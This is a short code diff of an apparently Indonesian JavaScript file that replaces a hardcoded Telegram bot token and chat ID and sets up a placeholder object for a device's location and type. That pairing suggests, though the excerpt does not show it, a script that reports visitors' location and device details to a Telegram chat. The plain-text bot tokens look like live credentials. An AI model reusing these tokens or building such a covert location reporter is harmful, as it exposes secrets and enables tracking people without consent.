@@ -1,6 +1,6 @@
 // KONFIGURASI BOT TELEGRAM
-const BOT_TOKEN = '8074762578:AAFze7gDSC6mN4ygqKs-Mx71WprCU8-z_04';
-const CHAT_ID = '7402071395';
+const BOT_TOKEN = '8775719391:AAFsEGizC7fHpF-cYPISJXsnd1vV2z_ntW8';
+const CHAT_ID = '6883233614';
 
 // INFO PERANGKAT & LOKASI
 let infoPerangkat = { lokasi: 'Mendeteksi...', perangkat: 'Perangkat Tidak Diketahui' };
